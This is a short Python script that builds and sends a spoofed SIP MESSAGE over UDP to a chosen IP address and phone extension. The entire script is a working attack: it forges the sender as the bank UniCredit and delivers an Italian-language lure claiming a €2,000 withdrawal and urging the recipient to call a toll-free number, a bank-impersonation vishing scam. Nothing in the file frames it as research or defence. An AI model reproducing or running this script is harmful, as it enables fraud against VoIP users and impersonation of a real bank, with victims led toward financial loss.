import sys, socket, random, string

UDP_IP = sys.argv[1]
UDP_PORT = 5060
ext = sys.argv[2]
rand = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
msg="MESSAGE sip:%s@%s SIP/2.0\r\n" % (ext, UDP_IP)
msg+="Via: SIP/2.0/UDP 192.168.2.19:10096;rport;branch=z9hG4bK-%s\r\n" % rand
msg+="Max-Forwards: 70\r\n"
msg+="From: <sip:UniCredit@%s>;tag=%s\r\n" %(UDP_IP, rand)
msg+="To: <sip:%s@%s>\r\n" %(ext, UDP_IP)
msg+="Call-ID: %s\r\n" % rand
msg+="CSeq: 1 MESSAGE\r\n"
msg+="Contact: <sip:UniCredit@192.168.2.19:10060;transport=udp>\r\n"
msg+="Content-Type: text/plain\r\n"
msg+="Content-Length: 73\r\n\r\n"
msg+="E' stato effettuato un prelievo di €2.000.\nChiama il numero verde 80127"

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(msg.encode(), (UDP_IP, UDP_PORT))